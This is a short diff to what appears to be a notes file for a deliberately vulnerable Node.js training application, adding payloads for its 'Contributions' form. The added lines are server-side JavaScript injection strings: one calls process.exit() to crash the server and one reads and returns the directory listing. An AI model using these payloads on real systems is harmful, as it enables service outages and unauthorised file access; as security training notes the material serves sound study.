@@ -1,3 +1,6 @@
 
 Injections:
-  Denial of Service (in Contributions)
+  Denial of Service (in Contributions): process.exit()
+  File System Access (in Contributions): res.end(require('fs').readdirSync('.').toString())
+  
+  
